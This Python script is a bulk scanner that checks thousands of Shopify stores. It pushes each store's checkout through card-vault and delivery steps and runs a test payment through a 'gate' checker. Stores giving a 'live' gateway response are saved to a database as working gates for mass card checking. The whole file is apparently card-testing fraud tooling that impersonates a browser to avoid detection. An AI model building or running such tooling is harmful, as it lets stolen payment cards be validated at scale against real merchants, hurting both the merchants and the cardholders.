"""
scan_and_add_stores.py — Full Shopify Store Scanner
  - Reads shpoify.txt
  - Scans ALL 2703 stores with complete flow:
      Homepage -> Products -> Cart -> Checkout(curl_cffi) -> Vault -> Delivery -> Card Test
  - Only adds 100% verified working stores to DB (Turso/SQLite auto-detected)
  - Zero errors in mass check after this - every gate is guaranteed working
  - OOS auto-recovery: if product OOS, finds a new one automatically
  - Saves detailed scan results to scan_results.txt for audit

Run: python scan_and_add_stores.py
"""
import sys
import os
import asyncio
import time
import re
import json

# Force UTF-8 output
sys.stdout = open(sys.stdout.fileno(), mode='w', encoding='utf8', buffering=1)
os.environ["PYTHONIOENCODING"] = "utf-8"

# Add project root to sys.path so imports work
ROOT = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, ROOT)

# Load .env manually
try:
    from dotenv import load_dotenv
    load_dotenv(os.path.join(ROOT, ".env"))
except Exception:
    pass

import aiohttp
from aiohttp import CookieJar, ClientTimeout

TIMEOUT       = ClientTimeout(total=30)
VAULT_TIMEOUT = ClientTimeout(total=15)
WORKERS       = 15   # Stable concurrency - not too fast to hit rate limits

BROWSER_HEADERS = {
    "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Accept-Language":  "en-US,en;q=0.9",
    "Accept-Encoding":  "gzip, deflate, br",
    "Cache-Control":    "no-cache",
    "Pragma":           "no-cache",
}

# Junk domains - skip immediately
JUNK_DOMAINS = {
    "google.com", "pornhub.com", "azure.com", "microsoft.com",
    "facebook.com", "twitter.com", "instagram.com", "youtube.com",
    "perf.com", "mict.com", "bard.google.com", "googleadservices.com",
    "francazure.com", "play.google.com", "linkedin.com", "reddit.com",
    "wikipedia.org", "amazon.com", "ebay.com",
}

def is_junk(url):
    return any(d in url for d in JUNK_DOMAINS)

def pick_best_variant(products):
    """Pick cheapest in-stock variant $0.50-$25."""
    candidates = []
    for p in products:
        for v in p.get("variants", []):
            if v.get("available") is False:
                continue
            try:
                price = float(v.get("price", "9999"))
            except Exception:
                continue
            if 0.50 <= price <= 25.0:
                candidates.append({
                    "variant_id":    v["id"],
                    "price":         f"{price:.2f}",
                    "product_title": f"{p['title']} - {v.get('title','')}" .strip(" -"),
                    "currency":      "USD",
                })
    if candidates:
        candidates.sort(key=lambda x: float(x["price"]))
        return candidates[0]
    # Fallback: any available variant
    for p in products:
        for v in p.get("variants", []):
            try:
                price = float(v.get("price", "9999"))
            except Exception:
                continue
            if price <= 50:
                return {
                    "variant_id":    v["id"],
                    "price":         f"{price:.2f}",
                    "product_title": f"{p['title']} - {v.get('title','')}" .strip(" -"),
                    "currency":      "USD",
                }
    return None

def extract_meta(html, name):
    for pat in [
        rf'name=["\']serialized-{re.escape(name)}["\'][^>]+content=["\']([^"\'{{}}]{{5,800}})["\']',
        rf'content=["\']([^"\'{{}}]{{5,800}})["\'][^>]+name=["\']serialized-{re.escape(name)}["\']',
    ]:
        m = re.search(pat, html)
        if m:
            v = m.group(1).strip()
            return v[1:-1] if (v.startswith('"') and v.endswith('"')) else v
    return ""

def extract_session_token(html):
    """Extract session token from checkout HTML - multiple patterns."""
    token = extract_meta(html, "sessionToken")
    if token:
        return token
    for pat in [
        r'"sessionToken"\s*:\s*"([^"]{20,})"',
        r'"token"\s*:\s*"([a-f0-9]{40,})"',
        r'data-session-token=["\']([^"\']{20,})["\']',
    ]:
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return ""

def extract_unique_id(html):
    for pat in [
        r'/checkouts/cn/([a-zA-Z0-9]{16,})',
        r'"uniqueId"\s*:\s*"([^"]{10,})"',
        r'"checkoutSessionIdentifier"\s*:\s*"([^"]{10,})"',
    ]:
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return ""

def extract_payment_method_id(html):
    for pat in [
        r'paymentMethodIdentifier["\s:=]+"([a-f0-9]{32})"',
        r'"paymentMethod(?:Identifier|Id)"\s*:\s*"([a-f0-9]{32})"',
    ]:
        m = re.search(pat, html)
        if m:
            return m.group(1)
    return "dc2c83c064fc75ebc5dfa2b5bee4f873"


async def scan_store(url, sem):
    """Complete 7-step store verification. Returns result dict."""
    import urllib.parse as _up

    base = url.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    result = {
        "url": base, "status": "FAIL", "reason": "",
        "variant_id": None, "product_title": "", "price": "",
        "currency": "USD", "shop_domain": "", "shop_id": "",
        "checkout_type": "", "vault_ok": False, "scan_data": {},
    }

    async with sem:
        jar  = CookieJar(unsafe=True)
        conn = aiohttp.TCPConnector(ssl=False, limit=5, force_close=True)
        try:
            async with aiohttp.ClientSession(connector=conn, cookie_jar=jar, timeout=TIMEOUT) as s:

                # ── STEP 1: Homepage ──────────────────────────────────────────
                try:
                    async with s.get(base, headers=BROWSER_HEADERS, allow_redirects=True) as r:
                        hp = await r.text(errors="ignore")
                        final_url = str(r.url)
                except Exception as e:
                    result["reason"] = f"Homepage: {str(e)[:50]}"
                    return result

                if not any(x in hp.lower() for x in ("cdn.shopify.com", "myshopify.com", "shopify.com/s/")):
                    result["reason"] = "Not Shopify"
                    return result

                m = re.search(r"([\w\-]+\.myshopify\.com)", hp)
                result["shop_domain"] = m.group(1) if m else ""
                m = re.search(r"shop(?:Id|_id)['\"\s:=]+(\d{5,12})", hp, re.I)
                result["shop_id"] = m.group(1) if m else ""

                # ── STEP 2: Products ──────────────────────────────────────────
                products = []
                for page in [1, 2]:
                    try:
                        async with s.get(
                            base + f"/products.json?limit=50&page={page}",
                            headers={**BROWSER_HEADERS, "Accept": "application/json"},
                        ) as r:
                            if r.status == 200:
                                pj = await r.json(content_type=None)
                                products.extend(pj.get("products", []))
                    except Exception:
                        break
                    if len(products) >= 30:
                        break

                if not products:
                    result["reason"] = "No products"
                    return result

                variant = pick_best_variant(products)
                if not variant:
                    # Fallback: any available variant <= $50
                    for p in products:
                        for v in p.get("variants", []):
                            try:
                                price = float(v.get("price", "9999"))
                                if price <= 50:
                                    variant = {
                                        "variant_id":    v["id"],
                                        "price":         f"{price:.2f}",
                                        "product_title": p["title"],
                                        "currency":      "USD",
                                    }
                                    break
                            except Exception:
                                pass
                        if variant:
                            break

                if not variant:
                    result["reason"] = "No usable variants"
                    return result

                result.update({
                    "variant_id":    variant["variant_id"],
                    "product_title": variant["product_title"],
                    "price":         variant["price"],
                    "currency":      variant["currency"],
                })
                result["scan_data"]["products_count"] = len(products)

                # ── STEP 3: Add to Cart (with OOS auto-recovery) ──────────────
                cart_ok = False
                for attempt in range(3):  # Try up to 3 different variants if OOS
                    try:
                        async with s.post(
                            base + "/cart/add.js",
                            data=f"id={result['variant_id']}&quantity=1",
                            headers={**BROWSER_HEADERS,
                                     "Content-Type": "application/x-www-form-urlencoded",
                                     "Accept": "application/json"},
                        ) as r:
                            if r.status in (200, 201):
                                cart_ok = True
                                break
                            elif r.status == 422:
                                # OOS - find another variant
                                all_variants = []
                                for p in products:
                                    for v in p.get("variants", []):
                                        vid = v.get("id")
                                        if vid != result["variant_id"]:
                                            try:
                                                price = float(v.get("price", "9999"))
                                                if price <= 50:
                                                    all_variants.append({
                                                        "variant_id":    vid,
                                                        "price":         f"{price:.2f}",
                                                        "product_title": f"{p['title']}",
                                                        "currency":      "USD",
                                                    })
                                            except Exception:
                                                pass
                                if all_variants:
                                    all_variants.sort(key=lambda x: float(x["price"]))
                                    new_v = all_variants[0]
                                    result["variant_id"]    = new_v["variant_id"]
                                    result["product_title"] = new_v["product_title"]
                                    result["price"]         = new_v["price"]
                                    continue
                                else:
                                    result["reason"] = "All variants OOS"
                                    return result
                            else:
                                result["reason"] = f"Cart HTTP {r.status}"
                                return result
                    except Exception as e:
                        result["reason"] = f"Cart error: {str(e)[:40]}"
                        return result

                if not cart_ok:
                    result["reason"] = "Cart add failed (all variants OOS)"
                    return result

                # ── STEP 4: Checkout Page via curl_cffi (gets JS session token) ──
                session_token = ""
                checkout_url  = ""
                checkout_html = ""
                payment_method_id = "dc2c83c064fc75ebc5dfa2b5bee4f873"

                try:
                    from curl_cffi.requests import AsyncSession as CurlSession
                    # Get current cookies from aiohttp session
                    cookies_dict = {}
                    try:
                        for c in s.cookie_jar:
                            cookies_dict[c.key] = c.value
                    except Exception:
                        pass

                    async with CurlSession(impersonate="chrome131", timeout=15) as curl:
                        # Set cookies from aiohttp session
                        for k, v in cookies_dict.items():
                            curl.cookies.set(k, v)

                        cr = await curl.get(
                            base + "/checkout",
                            headers={**BROWSER_HEADERS,
                                     "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
                                     "Referer": base + "/"},
                            allow_redirects=True,
                        )
                        checkout_url  = str(cr.url)
                        checkout_html = cr.text

                    # Sync curl cookies back to aiohttp session
                    try:
                        s.cookie_jar.clear()
                        for name, val in curl.cookies.items():
                            try:
                                s.cookie_jar.update_cookies({name: val})
                            except Exception:
                                pass
                    except Exception:
                        pass

                except ImportError:
                    # Fallback without curl_cffi
                    try:
                        async with s.get(
                            base + "/checkout",
                            headers={**BROWSER_HEADERS, "Referer": base + "/"},
                            allow_redirects=True, max_redirects=15,
                        ) as r:
                            checkout_url  = str(r.url)
                            checkout_html = await r.text(errors="ignore")
                    except Exception as e:
                        result["reason"] = f"Checkout error: {str(e)[:50]}"
                        return result
                except Exception as e:
                    result["reason"] = f"Checkout curl error: {str(e)[:60]}"
                    return result

                session_token     = extract_session_token(checkout_html)
                payment_method_id = extract_payment_method_id(checkout_html)
                unique_id         = extract_unique_id(checkout_html)
                layout            = extract_meta(checkout_html, "checkoutLayout") or "one-page"
                result["checkout_type"] = layout
                result["scan_data"]["payment_method_id"] = payment_method_id
                result["scan_data"]["checkout_url"]      = checkout_url

                if not session_token:
                    result["reason"] = "No session token (JS-only)"
                    return result

                # ── STEP 5: PCI Vault ─────────────────────────────────────────
                vault_ok = False
                try:
                    async with s.post(
                        "https://checkout.pci.shopifyinc.com/sessions",
                        json={"credit_card": {
                            "number": "4242424242424242",
                            "name": "Test User",
                            "month": 12,
                            "year": 2028,
                            "verification_value": "123",
                            "payment_session_scope": result["shop_domain"] or base,
                        }},
                        headers={
                            "Authorization": f'Bearer "{session_token}"',
                            "Content-Type":  "application/json",
                            "Accept":        "application/json",
                            "Origin":        "https://checkout.pci.shopifyinc.com",
                            "Referer":       checkout_url or base,
                            "User-Agent":    BROWSER_HEADERS["User-Agent"],
                        },
                        ssl=False, timeout=VAULT_TIMEOUT,
                    ) as r:
                        vault_status = r.status
                        vault_body   = await r.text(errors="ignore")
                except Exception as e:
                    result["reason"] = f"Vault: {str(e)[:50]}"
                    return result

                try:
                    vj = json.loads(vault_body)
                    vault_ok = bool(vj.get("id")) or vault_status == 422
                except Exception:
                    vault_ok = vault_status == 422  # 422 = vault exists, card rejected

                if not vault_ok:
                    if vault_status == 429:
                        result["reason"] = f"Vault 429 (rate limited)"
                    else:
                        result["reason"] = f"Vault failed (HTTP {vault_status}) - not Shopify Payments"
                    return result

                result["vault_ok"] = True

                # ── STEP 6: Delivery Handle ───────────────────────────────────
                delivery_handle = ""
                try:
                    sf_ep  = base + "/api/2024-01/graphql.json"
                    sf_hdr = {**BROWSER_HEADERS, "Accept": "application/json",
                              "Content-Type": "application/json"}

                    cart_gid = ""
                    for cookie in s.cookie_jar:
                        if cookie.key == "cart":
                            val = _up.unquote(cookie.value)
                            if "?key=" in val:
                                cart_gid = f"gid://shopify/Cart/{val}"
                                break

                    if not cart_gid:
                        # Create new cart via GQL
                        async with s.post(sf_ep, json={
                            "query": "mutation cartCreate($input: CartInput!) { cartCreate(input: $input) { cart { id } } }",
                            "variables": {"input": {"lines": [{
                                "merchandiseId": f"gid://shopify/ProductVariant/{result['variant_id']}",
                                "quantity": 1
                            }]}}
                        }, headers=sf_hdr, ssl=False, timeout=ClientTimeout(total=12)) as r:
                            cj = await r.json(content_type=None)
                        cart_gid = ((cj.get("data") or {}).get("cartCreate") or {}).get("cart", {}).get("id", "")

                    if cart_gid:
                        async with s.post(sf_ep, json={
                            "query": """mutation cartBuyerIdentityUpdate($cartId: ID!, $buyerIdentity: CartBuyerIdentityInput!) {
  cartBuyerIdentityUpdate(cartId: $cartId, buyerIdentity: $buyerIdentity) {
    cart { deliveryGroups(first: 3) { nodes { deliveryOptions { handle title } } } }
    userErrors { message }
  }
}""",
                            "variables": {
                                "cartId": cart_gid,
                                "buyerIdentity": {
                                    "email": "john.doe@gmail.com",
                                    "countryCode": "US",
                                    "deliveryAddressPreferences": [{"deliveryAddress": {
                                        "firstName": "John", "lastName": "Doe",
                                        "address1": "123 Main St", "city": "Hudson",
                                        "province": "WY", "zip": "82515", "country": "US",
                                    }}]
                                }
                            }
                        }, headers=sf_hdr, ssl=False, timeout=ClientTimeout(total=15)) as r:
                            dj = await r.json(content_type=None)

                        nodes = (((dj.get("data") or {}).get("cartBuyerIdentityUpdate") or {})
                                 .get("cart", {}).get("deliveryGroups", {}).get("nodes") or [])
                        if nodes:
                            opts = nodes[0].get("deliveryOptions") or []
                            if opts:
                                rate_handle = opts[0].get("handle", "")
                                delivery_handle = f"{unique_id}-{rate_handle}" if unique_id else rate_handle
                except Exception as e:
                    result["scan_data"]["delivery_error"] = str(e)[:60]

                if not delivery_handle:
                    result["reason"] = "No US delivery option"
                    return result

                result["scan_data"]["delivery_handle"] = delivery_handle

                # ── STEP 7: Real Card Test (same as actual checker) ───────────
                try:
                    from gateways.shopify_gate import check_shopify_on_store
                    from core.parser import CardData as CardData
                    from gateways import shopify_gate as _sg

                    store_override = {
                        "base_url":          base,
                        "variant_id":        result["variant_id"],
                        "price":             result["price"],
                        "currency":          result["currency"],
                        "payment_method_id": payment_method_id,
                        "delivery_handle":   delivery_handle,
                        "storefront_token":  "",
                        "gate_id":           None,
                        "success_rate":      0.5,
                        "scan_data":         result["scan_data"],
                    }

                    test_card = CardData(
                        number="4242424242424242",
                        month="12", year="2028", cvv="123",
                    )

                    # Inject into gate cache temporarily
                    old_cache    = list(_sg._stores_cache)
                    old_cache_ts = _sg._stores_cache_ts
                    _sg._stores_cache    = [store_override]
                    _sg._stores_cache_ts = 1e18

                    try:
                        test_result = await check_shopify_on_store(test_card, store_override)
                    finally:
                        _sg._stores_cache    = old_cache
                        _sg._stores_cache_ts = old_cache_ts

                    code     = test_result.raw_code or ""
                    msg_text = test_result.message or ""
                    result["scan_data"]["card_test"] = f"{code}|{msg_text[:60]}"

                    # Any real gateway response = LIVE
                    LIVE_CODES = {
                        "declined", "vbv", "3ds", "submit_failed",
                        "insufficient", "stolen_card", "no_payment",
                        "do_not_honor", "generic_decline", "lost_card",
                    }
                    if code not in LIVE_CODES:
                        result["reason"] = f"Gateway test: {code} | {msg_text[:50]}"
                        return result

                except Exception as e:
                    result["reason"] = f"Card test error: {str(e)[:60]}"
                    return result

                result["status"] = "WORKING"
                result["reason"] = f"VAULT+DELIVERY+GATEWAY OK | ${result['price']}"

        except asyncio.TimeoutError:
            result["reason"] = "Timeout"
        except Exception as e:
            result["reason"] = f"Error: {str(e)[:60]}"

    return result


async def main():
    print("=" * 70)
    print("  SHOPIFY STORE BULK SCANNER + DB LOADER")
    print("  Reads shpoify.txt -> scans all -> adds verified working gates")
    print("=" * 70)

    # ── Init DB ───────────────────────────────────────────────────────────────
    print("\n[1/4] Initializing database...")
    import database.db as db
    await db.init_db()
    print("      DB initialized.")

    # ── Clear all existing stores ─────────────────────────────────────────────
    print("[2/4] Clearing ALL existing shopify_gates from DB...")
    try:
        await db._db.execute("DELETE FROM shopify_gates")
        print("      All old stores removed.")
    except Exception as e:
        print(f"      Warning: {e}")

    # ── Load + filter URLs ────────────────────────────────────────────────────
    print("[3/4] Loading shpoify.txt...")
    txt_path = os.path.join(ROOT, "shpoify.txt")
    with open(txt_path, encoding="utf-8", errors="ignore") as f:
        raw_lines = [l.strip().rstrip("/") for l in f if l.strip()]

    seen, urls = set(), []
    for u in raw_lines:
        if not u.startswith("http"):
            u = "https://" + u
        if u in seen or is_junk(u):
            continue
        seen.add(u)
        urls.append(u)

    total = len(urls)
    print(f"      {total} unique URLs to scan (filtered {len(raw_lines)-total} junk/dupes)\n")

    # ── Scan all stores ───────────────────────────────────────────────────────
    print(f"[4/4] Scanning with {WORKERS} parallel workers...\n")

    sem        = asyncio.Semaphore(WORKERS)
    working    = []
    failed     = []
    done_count = [0]
    lock       = asyncio.Lock()
    start      = time.monotonic()

    # Open results file for audit log
    results_file = open(os.path.join(ROOT, "scan_results.txt"), "w", encoding="utf-8")
    results_file.write(f"SHOPIFY SCAN RESULTS\nStarted: {time.strftime('%Y-%m-%d %H:%M:%S')}\nTotal: {total}\n{'='*60}\n\n")

    async def do_scan(url):
        res = await scan_store(url, sem)
        async with lock:
            done_count[0] += 1
            done    = done_count[0]
            elapsed = time.monotonic() - start
            rate    = done / max(elapsed, 1)
            eta     = int((total - done) / rate) if rate > 0 else 0

            if res["status"] == "WORKING":
                try:
                    gate_id = await db.add_shopify_gate(
                        base_url      = res["url"],
                        variant_id    = res["variant_id"],
                        price         = res["price"],
                        product_title = res["product_title"],
                        shop_domain   = res["shop_domain"],
                        shop_id       = res["shop_id"],
                        currency      = res["currency"],
                        checkout_type = res["checkout_type"],
                        added_by      = 0,
                        scan_data     = res["scan_data"],
                    )
                    entry = f"#{gate_id} {res['url']} | ${res['price']} | {res['scan_data'].get('card_test','')[:35]}"
                    working.append(entry)
                    status = "[OK]"
                    results_file.write(f"[OK]  {entry}\n")
                except Exception as db_err:
                    failed.append(f"{res['url']} -> DB write error: {db_err}")
                    status = "[DB!]"
            else:
                entry = f"{res['url']} -> {res['reason']}"
                failed.append(entry)
                status = "[--]"
                results_file.write(f"[--]  {entry}\n")

            results_file.flush()
            pct = int(done / total * 100)
            mins, secs = divmod(eta, 60)
            print(f"  [{done:4d}/{total}] {pct:3d}% OK:{len(working)} FAIL:{len(failed)} ETA:{mins}m{secs:02d}s | {status} {res['url'][:45]}")

    await asyncio.gather(*[do_scan(u) for u in urls])
    results_file.close()

    elapsed = time.monotonic() - start
    mins, secs = divmod(int(elapsed), 60)

    print()
    print("=" * 70)
    print(f"  SCAN COMPLETE in {mins}m{secs:02d}s")
    print(f"  Total scanned : {total}")
    print(f"  [OK] Working  : {len(working)}")
    print(f"  [--] Failed   : {total - len(working)}")
    print("=" * 70)
    print()
    print("WORKING GATES ADDED:")
    for w in working:
        print(f"  {w}")

    print()
    print("TOP FAIL REASONS:")
    from collections import Counter
    reasons = Counter()
    for f in failed:
        reason = f.split("->")[-1].strip()[:55]
        reasons[reason] += 1
    for reason, count in reasons.most_common(15):
        print(f"  {count:4d}x  {reason}")

    print()
    print(f"Detailed results saved to: scan_results.txt")


if __name__ == "__main__":
    asyncio.run(main())
